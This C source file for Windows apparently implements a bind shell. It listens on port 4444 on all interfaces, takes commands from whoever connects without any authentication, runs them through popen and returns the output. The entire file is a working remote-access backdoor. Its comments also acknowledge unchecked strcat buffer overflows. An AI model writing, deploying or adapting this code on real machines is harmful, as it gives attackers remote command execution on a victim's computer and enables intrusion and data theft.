#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

// Need to link with Ws2_32.lib
// unfortunately this does not work, so when compiling we manually tell gcc to use this library to compile with the "-lws2_32" option.
#pragma comment (lib, "ws2_32.lib")



// Two macros for stringizing s
// More info at https://gcc.gnu.org/onlinedocs/cpp/Argument-Prescan.html#Argument-Prescan
#define xstr(s) str(s)
#define str(s) #s

#define REPLY_SIZE 1024
#define BUF_SIZE 512

int startShell();
char* processMsg(char msg[BUF_SIZE]);
char* processCmd(char msg[BUF_SIZE]);

int port;
char ip[24];

int main(){
    port = 4444;  // default value
    strcpy(ip, "192.168.1.1");  // default value

    #ifdef PORT
        port = PORT;
    #endif

    #ifdef IP
        strcpy(ip, xstr(IP));
    #endif

    startShell();

    return 0;
}

/*
Starts the shell
Return values:
    0 - exited normally/successfully
    1 - exited with error
*/
int startShell() {
    printf("Starting shell with the following settings:\n");
    printf("Port: %d\n", port);
    printf("IP: %s\n", ip);

    // initialize winsock
    WSADATA wsData;
    WORD version = MAKEWORD(2,2);
    int wsock = WSAStartup(version, &wsData);
    if ( wsock != 0) {
        printf("Can't initialize winsock. Quitting...\n");
        return 1;
    }

    // create a socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET){
        printf("Invalid socket. Quitting...\n");
        return 1;
    }

    // bind socket to ip address and port
    struct sockaddr_in hint; // a hint structure (?)
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.S_un.S_addr = INADDR_ANY; //same thing as the inet_pton line - tells to use any address (could set to use only the ip address given...)
    bind(sock, (struct sockaddr*)&hint, sizeof(hint));

    // tell winsock the socker for meant to listen for incoming connections
    listen(sock, SOMAXCONN);
    printf("Listening for incoming connection...\n");

    // wait for a connection
    struct sockaddr_in client;
    int clientSize = sizeof(client);
    SOCKET clientSocket = accept(sock, (struct sockaddr*)&client, &clientSize);

    // the connected host's ip
    char client_ip[NI_MAXHOST];
    memset(client_ip, 0, sizeof(client_ip));

    inet_ntop(AF_INET, &client.sin_addr, client_ip, NI_MAXHOST);
    printf("%s connected on port %d\n", client_ip, port);

    // close listening port once a connection has been recieved
    // don't need the listening socket because now we have the connected socket
    closesocket(sock);

    char buf[BUF_SIZE];
    while (TRUE){
        memset(buf, 0, sizeof(buf));
        int bytesRecv = recv(clientSocket, buf, sizeof(buf), 0); // this function returns the length of the message in bytes
        if (bytesRecv == SOCKET_ERROR){
            printf("Error recieving data. Exiting...\n");
            break;
        } else if (bytesRecv == 0){
            printf("Client disconnected. Exiting...\n");
            break;
        }

        // at this point we have there message in buf and the size in bytesRecv
        char * reply;
        reply = processMsg(buf);

        // send message back to the client
        send(clientSocket, reply, REPLY_SIZE, 0);
        free(reply);
    }
    
    closesocket(clientSocket);
    WSACleanup();
    return 0;
}

/*
Function for proccessing the input sent from the client
Places the necessary response in char *reply, and returns a pointer to the reply in memory
*/
char* processMsg(char msg[BUF_SIZE]){
    // check if a shell (cmd prompt) command is being issued
    // an input that starts with "cmd" or "c"
    if (strcmp(strtok(msg, " "), "cmd") == 0 || strcmp(strtok(msg, " "), "c") == 0){
        char * msgptr = msg;
        msgptr+=(strcspn(msg, " ")+1); // pass everthing after the "cmd " or "c " at the beginning of the msg
        return processCmd(msgptr);
    }
    else {  // it is a command not meant to be executed by the shell
        char * reply = (char*)calloc(REPLY_SIZE, sizeof(char));
        strcpy(reply, "That is not a shell command and is currently not supported\n");
        return reply;
    }
}

char* processCmd(char cmd[BUF_SIZE]) {
    FILE *fp;

    // may be problem here with buffer overflow causing crash when reply is too big
    fp = popen(cmd, "r");
    char * finalResult = (char*)calloc(REPLY_SIZE, sizeof(char));
    char line[REPLY_SIZE];
    while (fgets(line, REPLY_SIZE, fp) != NULL) {
        // NOTE - This has the possibility of causing a buffer overflow error if the length is greater than REPLY_SIZE
        strcat(finalResult, line);
    }

    return finalResult;
}

